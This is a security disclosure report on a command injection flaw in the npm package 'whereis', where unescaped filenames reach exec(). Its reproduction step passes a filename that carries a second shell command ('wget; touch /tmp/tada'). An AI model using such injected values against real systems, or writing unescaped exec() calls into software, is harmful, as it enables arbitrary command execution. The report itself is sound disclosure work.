Summary:

I would like to report command injection in `whereis`
It allows to inject arbitrary shell commands by trying to locate crafted filenames.

# Vulnerability

## Vulnerability Description

File name argument is not properly escaped before being concatenated into the command that is passed to `exec()`.

See lines https://github.com/vvo/node-whereis/blob/master/index.js#L4-L12

## Steps To Reproduce:

```js
var whereis = require('whereis');
var filename = 'wget; touch /tmp/tada';
whereis(filename, function(err, path) {
  console.log(path);
});
```

Observe file `/tmp/tada` created.

## Supporting Material/References:

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0
- bash 4.4.012

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

For setups where unsanitized user input could end up in `whereis` argument, users would be able to execute arbitrary shell commands.
